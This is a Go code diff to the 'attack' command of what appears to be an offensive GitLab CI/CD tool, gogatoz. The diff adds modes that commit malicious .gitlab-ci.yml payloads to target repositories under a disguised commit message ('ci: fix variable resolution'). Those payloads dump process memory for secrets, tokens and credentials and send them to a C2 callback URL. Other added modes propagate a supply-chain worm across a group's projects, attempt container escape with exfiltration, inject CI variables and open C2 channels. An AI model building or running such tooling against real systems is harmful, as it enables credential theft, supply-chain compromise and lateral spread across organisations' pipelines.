@@ -23,7 +23,6 @@ import (
 	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
 	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
 	"github.com/mr-pmillz/gogatoz/pkg/pivot"
-	"github.com/mr-pmillz/gogatoz/pkg/store"
 	"github.com/spf13/cobra"
 	gitlab "gitlab.com/gitlab-org/api/client-go"
 )
@@ -1262,7 +1261,7 @@ var attackCmd = &cobra.Command{
 				listenTimeout = 10 * time.Minute
 			}
 
-			listener := newRorShellListener(listenAddr, cmd.OutOrStdout(), cliStore, strings.TrimSpace(gitlabURL), atkTarget)
+			listener := newRorShellListener(listenAddr, cmd.OutOrStdout())
 			go func() {
 				if err := listener.Run(ctx); err != nil && err != http.ErrServerClosed {
 					fmt.Fprintf(cmd.ErrOrStderr(), "[ror-listener] error: %v\n", err)
@@ -1382,16 +1381,29 @@ var attackCmd = &cobra.Command{
 			if strings.TrimSpace(atkMessage) == "" {
 				atkMessage = "ci: fix variable resolution"
 			}
-			// Render a memory dump payload via infostealer with proc-scan and mem-dump
-			memProc := strings.TrimSpace(atkMemoryDumpProc)
-			memFilter := strings.TrimSpace(atkMemoryDumpFilter)
-			if memFilter == "" {
-				memFilter = ".*SECRET|.*TOKEN|.*KEY|.*PASS|.*CRED"
+			c2URL := strings.TrimSpace(atkWebhook)
+			var tags []string
+			if strings.TrimSpace(atkTags) != "" {
+				for t := range strings.SplitSeq(atkTags, ",") {
+					t = strings.TrimSpace(t)
+					if t != "" {
+						tags = append(tags, t)
+					}
+				}
 			}
-			payload := payloadgen.GenerateInfostealerScript(payloadgen.InfostealerOptions{
-				ProcScan:   true,
-				MemoryDump: true,
-				Extended:   true,
+			payload := payloadgen.GenerateMemoryDumpYAML(payloadgen.MemoryDumpOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    tags,
+					Manual:  atkManual,
+				},
+				CallbackURL:   c2URL,
+				EncryptionKey: strings.TrimSpace(atkTamperTagEncKey),
+				ProcScan:      true,
+				MemoryDump:    true,
+				Extended:      true,
 			})
 			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", payload, atkMessage); err != nil {
 				return fmt.Errorf("commit memory dump payload: %w", err)
@@ -1399,15 +1411,13 @@ var attackCmd = &cobra.Command{
 			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed memory dump payload to branch %s\n", finalBranch)
 			if outputJSON {
 				out := struct {
-					Branch     string `json:"branch"`
-					ProcFilter string `json:"proc_filter"`
-					HasDump    bool   `json:"memory_dump"`
-					HasScan    bool   `json:"proc_scan"`
+					Branch  string `json:"branch"`
+					HasDump bool   `json:"memory_dump"`
+					HasScan bool   `json:"proc_scan"`
 				}{
-					Branch:     finalBranch,
-					ProcFilter: memFilter,
-					HasDump:    atkMemoryDumpProc != "" || memProc != "",
-					HasScan:    true,
+					Branch:  finalBranch,
+					HasDump: true,
+					HasScan: true,
 				}
 				b, _ := json.MarshalIndent(out, "", "  ")
 				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
@@ -1441,9 +1451,9 @@ var attackCmd = &cobra.Command{
 				groupPath = strings.TrimSpace(atkWormTargetGroup)
 			}
 			if groupPath == "" {
-				return fmt.Errorf("--target-group or use the target project's group for worm propagation")
+				return fmt.Errorf("--worm-target-group is required when the target project has no group namespace")
 			}
-			result := payloadgen.RunSupplyChainWorm(ctx, client.GL, p.ID, groupPath, wormPayload, maxRepos, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, cmd.ErrOrStderr())
+			result := payloadgen.RunSupplyChainWorm(ctx, client.GL, p.ID, groupPath, wormPayload, maxRepos, atkBranch, atkAuthorName, atkAuthorEmail, cmd.ErrOrStderr())
 			if outputJSON {
 				b, _ := json.MarshalIndent(result, "", "  ")
 				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
@@ -1523,25 +1533,16 @@ var attackCmd = &cobra.Command{
 		// variable-inject mode: inject malicious CI variables into project/group scope
 		if atkVariableInject {
 			if strings.TrimSpace(atkInjectVars) == "" {
-				return fmt.Errorf("--inject-vars is required (JSON: '{\"MY_SECRET\": \"value\"}')")
+				return fmt.Errorf("--inject-vars is required (JSON: '[{\"key\":\"MY_SECRET\",\"value\":\"val\"}]')")
 			}
 			scope := strings.ToLower(strings.TrimSpace(atkInjectScope))
 			if scope == "" {
 				scope = "project"
 			}
-			if strings.TrimSpace(atkBranch) == "" {
-				atkBranch = "gogatoz-var-inject"
-			}
-			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
-			if berr != nil {
-				return berr
-			}
 			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
-			if _, err := att.SetupUser(ctx); err != nil {
-				return fmt.Errorf("setup user: %w", err)
-			}
 			type injectVar struct {
 				Key         string `json:"key"`
+				Value       string `json:"value"`
 				Protected   bool   `json:"protected"`
 				Masked      bool   `json:"masked"`
 				Environment string `json:"environment_scope"`
@@ -1549,6 +1550,14 @@ var attackCmd = &cobra.Command{
 			var vars []injectVar
 			if err := json.Unmarshal([]byte(atkInjectVars), &vars); err != nil {
 				return fmt.Errorf("parse --inject-vars JSON: %w", err)
+			}
+			for i := range vars {
+				if atkInjectProtected {
+					vars[i].Protected = true
+				}
+				if atkInjectMasked {
+					vars[i].Masked = true
+				}
 			}
 			results := make([]struct {
 				Key     string `json:"key"`
@@ -1571,7 +1580,7 @@ var attackCmd = &cobra.Command{
 						}{Key: v.Key, Scope: scope, Success: false, Error: "--group-id required for group-scope injection"})
 						continue
 					}
-					_, _, err := att.SetGroupVariable(ctx, gid, v.Key, v.Key, !v.Protected, v.Masked, "")
+					_, _, err := att.SetGroupVariable(ctx, gid, v.Key, v.Value, !v.Protected, v.Masked, v.Environment)
 					results = append(results, struct {
 						Key     string `json:"key"`
 						Scope   string `json:"scope"`
@@ -1579,7 +1588,7 @@ var attackCmd = &cobra.Command{
 						Error   string `json:"error,omitempty"`
 					}{Key: v.Key, Scope: scope + ":" + gid, Success: err == nil, Error: ifErr(err)})
 				} else {
-					_, _, err := att.SetProjectVariable(ctx, atkTarget, v.Key, v.Key, !v.Protected, v.Masked, "")
+					_, _, err := att.SetProjectVariable(ctx, atkTarget, v.Key, v.Value, !v.Protected, v.Masked, v.Environment)
 					results = append(results, struct {
 						Key     string `json:"key"`
 						Scope   string `json:"scope"`
@@ -1590,7 +1599,6 @@ var attackCmd = &cobra.Command{
 			}
 			if outputJSON {
 				b, _ := json.MarshalIndent(struct {
-					Branch   string `json:"branch"`
 					Scope    string `json:"scope"`
 					Injected []struct {
 						Key     string `json:"key"`
@@ -1599,8 +1607,7 @@ var attackCmd = &cobra.Command{
 						Error   string `json:"error,omitempty"`
 					} `json:"injected"`
 				}{
-					Branch: finalBranch,
-					Scope:  scope,
+					Scope: scope,
 					Injected: func() []struct {
 						Key     string `json:"key"`
 						Scope   string `json:"scope"`
@@ -2210,14 +2217,53 @@ func renderPayload() (string, error) {
 			MemoryDump:      atkTamperTagMemDump,
 			Extended:        atkTamperTagExtended,
 		}), nil
+	case "memory-dump", "memory_dump", "memorydump":
+		c2 := strings.TrimSpace(atkWebhook)
+		return payloadgen.GenerateMemoryDumpYAML(payloadgen.MemoryDumpOptions{
+			Common:      common,
+			CallbackURL: c2,
+			ProcScan:    true,
+			MemoryDump:  true,
+			Extended:    true,
+		}), nil
+	case "supplychain-worm", "supplychain_worm", "supplychainworm":
+		return payloadgen.GenerateSupplyChainWormYAML(payloadgen.SupplyChainWormOptions{
+			Common:      common,
+			CallbackURL: strings.TrimSpace(atkWebhook),
+			ExfilMethod: strings.TrimSpace(atkExfilMethod),
+			ExfilTarget: strings.TrimSpace(atkExfilTarget),
+		}), nil
+	case "container-escape", "container_escape", "containerescape":
+		return payloadgen.GenerateContainerEscapeYAML(payloadgen.ContainerEscapeOptions{
+			Common:       common,
+			EscapeMethod: strings.TrimSpace(atkEscapeMethod),
+			EscapeCmd:    strings.TrimSpace(atkEscapeCommand),
+			MountPath:    strings.TrimSpace(atkEscapeMountPath),
+			HostCommand:  strings.TrimSpace(atkCmd),
+			ExfilMethod:  strings.TrimSpace(atkExfilMethod),
+			ExfilTarget:  strings.TrimSpace(atkExfilTarget),
+		}), nil
+	case "variable-inject", "variable_inject", "variableinject", "var-inject":
+		return payloadgen.GenerateVariableInjectionYAML(payloadgen.VariableInjectionOptions{
+			Common:      common,
+			CallbackURL: strings.TrimSpace(atkWebhook),
+		}), nil
+	case "c2-channels", "c2_channels", "c2channels", "c2-channel", "c2channel":
+		return payloadgen.GenerateC2ChannelYAML(payloadgen.C2ChannelOptions{
+			Common:      common,
+			ExfilMethod: strings.TrimSpace(atkC2Method),
+			ExfilTarget: strings.TrimSpace(atkC2Target),
+			KeepAlive:   atkC2KeepAlive,
+			CallbackURL: strings.TrimSpace(atkC2CallbackURL),
+		}), nil
 	default:
 		return "", fmt.Errorf("unsupported --payload: %s", atkPayload)
 	}
 }
 
 // newRorShellListener creates a new ror listener instance.
-func newRorShellListener(listenAddr string, out io.Writer, secretStore *store.Store, gitlabURL, target string) *Listener {
-	return NewListener(listenAddr, out, secretStore, gitlabURL, target)
+func newRorShellListener(listenAddr string, out io.Writer) *Listener {
+	return NewListener(listenAddr, out)
 }
 
 // resultsToMap converts listener results to a map of maps for DB persistence.
@@ -2229,13 +2275,15 @@ func resultsToMap(results []*CallbackResult) map[string]string {
 	return combined
 }
 
-// parsePipelineURL extracts the project ID from a GitLab pipeline URL string.
-func parsePipelineURL(url string) (int64, error) {
-	// Extract project ID from URLs like https://gitlab.com/group/project/-/pipelines/123
-	parts := strings.Split(url, "/")
+// parsePipelineURL extracts the pipeline ID from a GitLab pipeline URL string.
+// URL format: https://gitlab.com/group/project/-/pipelines/123
+func parsePipelineURL(pipelineURL string) (int64, error) {
+	parts := strings.Split(pipelineURL, "/")
 	for i := len(parts) - 1; i >= 0; i-- {
 		if parts[i] == "pipelines" && i+1 < len(parts) {
-			return 0, nil // pipeline ID, not project ID
+			var id int64
+			_, err := fmt.Sscanf(parts[i+1], "%d", &id)
+			return id, err
 		}
 	}
 	return 0, nil
